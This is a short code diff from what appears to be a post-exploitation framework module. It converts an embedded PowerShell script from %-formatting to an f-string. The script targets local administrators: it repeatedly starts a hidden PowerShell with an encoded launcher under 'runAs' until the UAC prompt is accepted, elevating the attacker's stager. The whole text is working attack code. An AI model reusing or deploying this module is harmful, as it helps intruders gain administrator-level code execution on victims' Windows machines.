@@ -42,23 +42,21 @@ class Module:
             else:
                 enc_launcher = " ".join(launcher.split(" ")[1:])
 
-                script = """
-if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1) {
-    while($True) {
-        try {
-            Start-Process "powershell" -ArgumentList "%s" -Verb runAs -WindowStyle hidden
+                script = f"""
+if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1) {{
+    while($True) {{
+        try {{
+            Start-Process "powershell" -ArgumentList "{enc_launcher}" -Verb runAs -WindowStyle hidden
             "[*] Successfully elevated!"
             break
-        }
-        catch {}
-    }
-}
-else  {
+        }}
+        catch {{}}
+    }}
+}}
+else  {{
     "[!] User is not a local administrator!"
-}
-""" % (
-                    enc_launcher
-                )
+}}
+"""
 
         script = main_menu.modulesv2.finalize_module(
             script=script,
